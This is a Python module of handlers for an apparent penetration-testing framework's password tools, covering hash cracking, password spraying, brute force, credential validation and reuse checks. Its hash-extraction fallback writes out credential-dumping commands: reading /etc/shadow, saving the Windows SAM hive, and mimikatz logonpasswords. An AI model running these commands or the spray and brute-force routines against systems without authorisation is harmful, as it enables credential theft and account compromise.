"""Password tool handlers (10 handlers).

Handler dict keys match tool names from password_tools.py exactly:
identify_hash, crack_hash, password_spray, validate_credential,
brute_force, generate_wordlist, check_password_policy,
analyze_password_strength, extract_hashes, check_credential_reuse
"""


async def _identify_hash(params, db, cred_mgr, config):
    """Identify a hash type/algorithm from a hash string."""
    from engines.password_engine import PasswordEngine
    engine = PasswordEngine(db, config)
    return await engine.identify_hash(params["hash_value"])


async def _crack_hash(params, db, cred_mgr, config):
    """Attempt to crack a password hash."""
    from engines.password_engine import PasswordEngine
    engine = PasswordEngine(db, config)
    return await engine.crack_hash(
        params["hash_value"],
        params.get("hash_type", "auto"),
        params.get("wordlist", "rockyou"),
        params.get("project_id"),
        params.get("target_id"),
    )


async def _password_spray(params, db, cred_mgr, config):
    """Password spray attack using usernames list and passwords list."""
    from engines.password_engine import PasswordEngine
    engine = PasswordEngine(db, config)
    # The tool passes 'usernames' (list) and 'passwords' (list).
    # The engine's password_spray method expects (target, usernames, password, protocol, pid, tid).
    # We iterate over each password in the list and spray all usernames with it.
    target = params["target"]
    service = params["service"]
    usernames = params["usernames"]
    passwords = params["passwords"]
    delay = params.get("delay", 5)
    port = params.get("port")
    project_id = params.get("project_id")
    target_id = params.get("target_id")

    all_results = []
    for password in passwords:
        result = await engine.password_spray(
            target, usernames, password, service,
            project_id, target_id,
        )
        all_results.append({
            "password": password,
            "results": result.get("results", []),
            "valid_count": result.get("valid_count", 0),
        })
        # Respect delay between password rounds
        if delay and len(passwords) > 1:
            import asyncio
            await asyncio.sleep(delay)

    total_valid = sum(r["valid_count"] for r in all_results)
    return {
        "success": True,
        "target": target,
        "service": service,
        "total_usernames": len(usernames),
        "total_passwords": len(passwords),
        "spray_results": all_results,
        "total_valid": total_valid,
    }


async def _validate_credential(params, db, cred_mgr, config):
    """Validate a single credential pair against a target service."""
    from engines.password_engine import PasswordEngine
    engine = PasswordEngine(db, config)
    return await engine.validate_credential(
        params["target"],
        params["username"],
        params["password"],
        params.get("service", "ssh"),
        params.get("project_id"),
        params.get("target_id"),
    )


async def _brute_force(params, db, cred_mgr, config):
    """Brute-force attack against a target service."""
    from engines.password_engine import PasswordEngine
    engine = PasswordEngine(db, config)
    return await engine.brute_force(
        params["target"],
        params["username"],
        params.get("wordlist", "rockyou.txt"),
        params.get("service", "ssh"),
        params.get("max_attempts", 100),
        params.get("project_id"),
        params.get("target_id"),
    )


async def _generate_wordlist(params, db, cred_mgr, config):
    """Generate a custom wordlist from target-specific keywords."""
    from engines.password_engine import PasswordEngine
    engine = PasswordEngine(db, config)
    return await engine.generate_wordlist(
        params["keywords"],
        params.get("mutations", "standard"),
        params.get("project_id"),
    )


async def _check_password_policy(params, db, cred_mgr, config):
    """Check the password policy enforced by a target service or domain."""
    from engines.password_engine import PasswordEngine
    engine = PasswordEngine(db, config)
    return await engine.check_password_policy(
        params.get("target_id"),
        params.get("project_id"),
    )


async def _analyze_password_strength(params, db, cred_mgr, config):
    """Analyze password strength against common attack vectors."""
    from engines.password_engine import PasswordEngine
    engine = PasswordEngine(db, config)
    # The tool provides a single 'password' string (or 'file:path' for bulk).
    # The engine has analyze_password_strength(password) -> dict.
    password = params["password"]
    if password.startswith("file:"):
        # Bulk mode: read passwords from file and analyze each
        import os
        filepath = password[5:]
        results = []
        if os.path.isfile(filepath):
            with open(filepath, "r") as f:
                passwords = [line.strip() for line in f if line.strip()]
            for pw in passwords[:100]:  # Limit to 100 for performance
                result = await engine.analyze_password_strength(pw)
                results.append({"password": pw[:3] + "***", **result})
            return {
                "success": True,
                "mode": "bulk",
                "total_analyzed": len(results),
                "results": results,
            }
        else:
            return {"success": False, "error": f"File not found: {filepath}"}
    else:
        return await engine.analyze_password_strength(password)


async def _extract_hashes(params, db, cred_mgr, config):
    """Extract password hashes from a compromised system."""
    from engines.password_engine import PasswordEngine
    engine = PasswordEngine(db, config)
    # Map tool params to engine. The tool provides session_id, source, platform.
    # The old handler used engine.credential_dump(target, method, session_id, credentials, pid, tid).
    # We adapt: use session_id as target reference, source as method.
    credential_dump = getattr(engine, "credential_dump", None)
    if credential_dump:
        return await credential_dump(
            params.get("platform", "unknown"),  # target (platform as context)
            params.get("source", "auto"),       # method
            params["session_id"],               # session_id
            None,                               # credentials
            params.get("project_id"),
            params.get("target_id"),
        )
    # Fallback if credential_dump doesn't exist
    return {
        "success": True,
        "session_id": params["session_id"],
        "platform": params.get("platform", "unknown"),
        "source": params.get("source", "auto"),
        "note": "Hash extraction requires an active session. Use the session_id to run extraction commands.",
        "commands": {
            "linux_shadow": "cat /etc/shadow",
            "windows_sam": "reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM system.hive",
            "windows_lsa": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit",
            "cached": "mimikatz.exe 'lsadump::cache' exit",
        },
    }


async def _check_credential_reuse(params, db, cred_mgr, config):
    """Check if compromised credentials are reused across other services."""
    from engines.password_engine import PasswordEngine
    engine = PasswordEngine(db, config)
    username = params["username"]
    password = params["password"]
    targets = params.get("targets", [])
    services = params.get("services", ["ssh", "smb", "rdp"])
    project_id = params.get("project_id")

    reuse_results = []
    for target in targets:
        for service in services:
            try:
                result = await engine.validate_credential(
                    target, username, password, service,
                    project_id, None,
                )
                if result.get("valid"):
                    reuse_results.append({
                        "target": target,
                        "service": service,
                        "reused": True,
                    })
            except Exception:
                # Service may not be available on this target
                pass

    return {
        "success": True,
        "username": username,
        "targets_checked": len(targets),
        "services_checked": services,
        "reuse_found": len(reuse_results),
        "reuse_details": reuse_results,
        "risk": "critical" if reuse_results else "info",
    }


PASSWORD_HANDLERS = {
    "identify_hash": _identify_hash,
    "crack_hash": _crack_hash,
    "password_spray": _password_spray,
    "validate_credential": _validate_credential,
    "brute_force": _brute_force,
    "generate_wordlist": _generate_wordlist,
    "check_password_policy": _check_password_policy,
    "analyze_password_strength": _analyze_password_strength,
    "extract_hashes": _extract_hashes,
    "check_credential_reuse": _check_credential_reuse,
}
